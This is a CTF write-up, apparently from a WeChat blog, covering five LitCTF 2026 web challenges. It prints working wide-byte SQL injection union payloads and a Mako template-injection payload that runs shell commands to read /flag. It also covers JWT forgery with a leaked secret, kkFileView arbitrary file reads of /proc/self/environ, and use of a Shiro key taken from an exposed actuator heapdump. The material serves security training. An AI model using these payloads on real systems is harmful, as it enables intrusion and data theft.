---
title: "LitCTF 2026 WEB方向全WP"
source: "https://mp.weixin.qq.com/s/4d5IvbO_Emj474gOW4njjA"
author:
  - "[[青岑]]"
published:
created: 2026-06-07
description:
tags:
  - "clippings"
---
---
title: "LitCTF 2026 WEB方向全WP"
source: "https://mp.weixin.qq.com/s/4d5IvbO_Emj474gOW4njjA"
author: "[[青岑]]"
published: ""
created: "2026-06-07T21:30:23+08:00"
description: ""
tags: [clippings]
---

# LitCTF 2026 WEB方向全WP

青岑 *2026年5月28日 22:18*

简单写一下今天做了的LitCTf的WP，但只有WEB

核心考点速览表

| 题目名称 | 核心考察技术点 |
| --- | --- |
| lit\_ezsql | 宽字节注入、Union联合查询、十六进制绕过单引号 |
| lit\_ezssti | Mako 模板注入、WAF关键字绕过、getattr()反射机制 |
| lit\_reverse\_my\_web | Go二进制逆向、main.main分析、JWT硬编码密钥伪造权限 |
| Northbridge Document Hub | 前端源码泄露凭证、kkFileView任意文件读取、Base64多重路径解析 |
| 华辰企业服务运营平台 | Actuator未授权访问、heapdump提取ShiroKey、Shiro-GCM垂直越权攻击 |

lit\_ezsql

题目描述

注注注！

爆破了一下我的 **查询闭合方式** 的字典，所有 payload 只会老实地返回：

![回显图](https://mmbiz.qpic.cn/sz_mmbiz_png/hkJddwtz6ErYgV6zLicvyK2lAMic0GIYPgFC0Du7bl8bkiagOOdS2J6xFBagkGgfiaDL9Jcm309cclmI7DbgJ3ib426t8M3u2kOnUqr1GtWibPXCk/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0)

也没有报错啥的，大概率是要 **宽字节注入** ，浏览器上方地址中传入：

/query?id=1%df'

返回报错了：

数据库错误：(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1\\'' LIMIT 50' at line 1")

接下来就是 Union 联合查询：

1\. 判断列数

/query?id=1%df' order by 5%23

正常回显 id 为 1 的查询结果。

/query?id=1%df' order by 6%23

返回 数据库错误：(1054, "Unknown column '6' in 'order clause'")。说明本题 **共 5 列** 。

2\. 找回显位

/query?id=-1%df' union select 1,2,3,4,5%23

返回：

查询结果 id name col2 col3 col4 1 2 3 4 5

说明本题每一列都是回显位置。

3\. 爆库名

/query?id=-1%df' union select 1,group\_concat(schema\_name),3,4,5 from information\_schema.schemata%23

得到 information\_schema,ezsql。

4\. 爆 ezsql 库的表名

/query?id=-1%df' union select 1,group\_concat(table\_name),3,4,5 from information\_schema.tables where table\_schema=0x657a73716c%23

\> 其中 `0x657a73716c` 是 `ezsql` 的十六进制。

得到 users,flag\_store。

5\. 爆 ezsql 库的 flag\_store 表的列名

/query?id=-1%df' union select 1,group\_concat(column\_name),3,4,5 from information\_schema.columns where table\_schema=0x657a73716c%23 and table\_name=0x666c61675f73746f7265

得到 id,name,col2,col3,col4,id,flag。

6\. 爆 flag\_store 表的 flag 列的数据

/query?id=-1%df' union select 1,flag,3,4,5 from ezsql.flag\_store%23

拿到 flag。

lit\_ezssti

题目描述

缺什么补什么（x

Wappalyzer 插件显示编程语言为 Python，先输入：

{{7\*7}}

原样回显，再输入：

${7\*7}

回显 `WAF` ，说明应该是猜对了，后端模板引擎是 **Mako** ，但是过滤了 `$` ，可以用 Mako 代码块 <%... %> 替代，输入：

<% context.write(\_\_import\_\_('os').popen('cat /flag').read()) %>

又回显 `WAF` ，测试一下是过滤了 `.` 和 `flag` ，把所有的 `.` **替换成 getattr()** ， `flag` **换成 fla\*** ，输入：

<%getattr(context,'write')(getattr(getattr(\_\_import\_\_('os'),'popen')('cat /fla\*'),'read')())%>

拿到 flag。

lit\_reverse\_my\_web

题目描述

Web手也要会逆向么喵？

不会逆向，我只会拽进 IDA 然后按 F5...

先 `shift + F4` 看函数列表， `ctrl + f` 搜 `main.main` ，点击去后按 F5 查看伪代码。

然后我也不会了，可以交给 re 手，说是能解出来一个 **JWT 密钥** ，为：

rMw\_2026\_litctf\_jwt\_secret\_key!!

回到熟悉的 WEB 靶机页面，先去开户申请注册一个账号 `test/123456` ，接着用这个账号去登录，登录进去后点击 `进入归档中心` ，显示：

您暂无此资源的访问权限

抓个包，看到有：

token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlzcyI6InJldmVyc2VNeVdlYiIsInN1YiI6InRlc3QiLCJleHAiOjE3Nzk1OTg5NDgsImlhdCI6MTc3OTUxMjU0OH0.8p5tANXSvqY0Sl07lVXzKYJlzeu\_QoR9cFIp6QSdfKc

这里伪造 JWT 使用的是 BurpSuite 插件 **JWT Editor** ：

![JWT分析](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

先去 BurpSuite 页面顶部的 `JWT Editor` ，点击 `New Symmetric Key` ，选择 `Specify secret` ，点击生成。

![JWT签名密钥伪造](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

确认后回到 `Repeater` 界面，把 role 的值从 `user` **改为 admin** ，点击 Sign ，选刚刚生成的 key 就可以了。

Northbridge Document Hub

题目描述

Northbridge 文档中心接入了 kkFileView 兼容的文件预览网关。  
研究员账号已开放，试着从解析缓存里找到本季度财务归档中的 flag。

查看源码，找到：

<script src="/assets/js/portal.js"></script>

点进链接，看到：

(function () { var bootstrap = { release: "2026.03.01-r12", region: "cn-sh2", auth: { mode: "legacy-fallback", // researcher:Research#2026 seed: "cmVzZWFyY2hlcjpSZXNlYXJjaCMyMDI2" }, fileGateway: { path: "/kkfileview/getCorsFile", queryKey: "urlPath", node: "legacy-parse-02" } }; window.NorthbridgePortal = { config: bootstrap, decodeLegacyCredential: function () { try { return atob(bootstrap.auth.seed); } catch (e) { return ""; } } }; var form = document.querySelector("form\[data-auth='portal'\]"); if (form) { form.addEventListener("submit", function () { form.classList.add("is-submitting"); }); } })();

1. 得到账号密码 researcher/Research#2026。
2. 可以访问 /kkfileview/getCorsFile 并传入 GET 参数 `urlPath` ，但是 `atob()` 函数说明值会被 **Base64 解码** 。

传入：

/kkfileview/getCorsFile?urlPath=L3Byb2Mvc2VsZi9lbnZpcm9u

\> Base64 解码后是 `/proc/self/environ` 。

成功拿到环境变量，但 flag 不在里面，换成读取容器启动脚本，传入：

/kkfileview/getCorsFile?urlPath=L3Vzci9sb2NhbC9iaW4vZG9ja2VyLWVudHJ5cG9pbnQuc2g=

\> Base64 解码后是 `/usr/local/bin/docker-entrypoint.sh` 。

在 sh 文件里面看到了 flag 被打包进了 `/opt/kkfileview/cache/parsed/q1_finance_report_2026.zip` 。

传入：

/kkfileview/getCorsFile?urlPath=L29wdC9ra2ZpbGV2aWV3L2NhY2hlL3BhcnNlZC9xMV9maW5hbmNlX3JlcG9ydF8yMDI2LnppcA==

\> Base64 解码后是 `/opt/kkfileview/cache/parsed/q1_finance_report_2026.zip` 。

下载 zip 文件，拿到 flag。

华辰企业服务运营平台

题目描述

某客服工单系统上线后，保留了大量运维与调试能力。  
你需要从系统暴露面和服务器中收集关键 information，完成权限突破并还原完整 flag

非预期方法：

dirsearch 扫目录看到了 `/actuator` 基本全能访问，优先去看环境变量，访问 /actuator/env，直接找到 flag。

预期方法：

访问 `/actutor/heapdump` 下载 `heapdump` 二进制文件，用 JDumpSpider 提取 **Shiro key** ：

curl -o heapdump http://127.0.0.1:18081/actuator/heapdump java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump

在返回结果中看到：

\=========================================== CookieRememberMeManager(ShiroKey) ------------- algMode = GCM, key = R1pDVEZTaGlyb0dDTUtleQ==, algName = AES

接着用 Java 8 启动 ShiroAttack2，类似如下进行配置：

![Shiro配置利用](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

`cat` 命令执行拿到 flag\_part1.txt：

flag{actuator\_heapdump\_

接着找别的路由看还有什么地方可能藏另一半 flag，访问 `/actuator/mappings` 看所有路由， `ctrl + f` 搜 `admin` ，看到有：

/api/admin/audit/list /api/admin/ops/reports /api/admin/system/export /api/admin/system/summary

在 /api/admin/audit/list 中最有可能藏有 flag。

先登录进去，题目给了用户名为 `user` ，弱密码爆破出来密码为 `user123` ，接着访问 `/api/admin/audit/list` ，返回：

{"source":"audit-service","items":\[{"id":"AR-8301","detail":"登录异地告警已人工复核为误报"},{"id":"AR-8302","detail":"数据库结构变更任务延后执行"},{"id":"AR-8303","detail":"历史归档备注: shiro\_gcm\_vertical\_auth}"}\]}

把 flag 进行拼接即可。

感谢青岑Sec yanxi师傅提供题解

继续滑动看下一个

青岑CTF

向上滑动看下一个